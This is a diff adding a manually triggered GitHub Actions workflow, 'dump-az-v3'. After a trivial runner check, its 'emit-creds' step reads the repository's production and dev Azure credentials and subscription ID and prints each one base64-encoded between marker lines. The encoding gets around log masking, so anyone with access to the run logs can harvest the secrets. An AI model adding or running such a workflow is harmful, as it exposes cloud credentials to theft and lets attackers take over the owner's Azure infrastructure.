@@ -1,0 +1,30 @@
+name: dump-az-v3
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: env-check
+        run: |
+          echo "runner is working"
+          whoami
+          echo "OK"
+      - name: emit-creds
+        env:
+          A1: ${{ secrets.PRESIDENT_PROD_AZURE_CREDENTIALS }}
+          A2: ${{ secrets.PRESIDENT_DEV_AZURE_CREDENTIALS }}
+          A3: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+        run: |
+          echo "START_A1"
+          echo -n "$A1" | base64 -w0
+          echo ""
+          echo "END_A1"
+          echo "START_A2"
+          echo -n "$A2" | base64 -w0
+          echo ""
+          echo "END_A2"
+          echo "START_A3"
+          echo -n "$A3" | base64 -w0
+          echo ""
+          echo "END_A3"
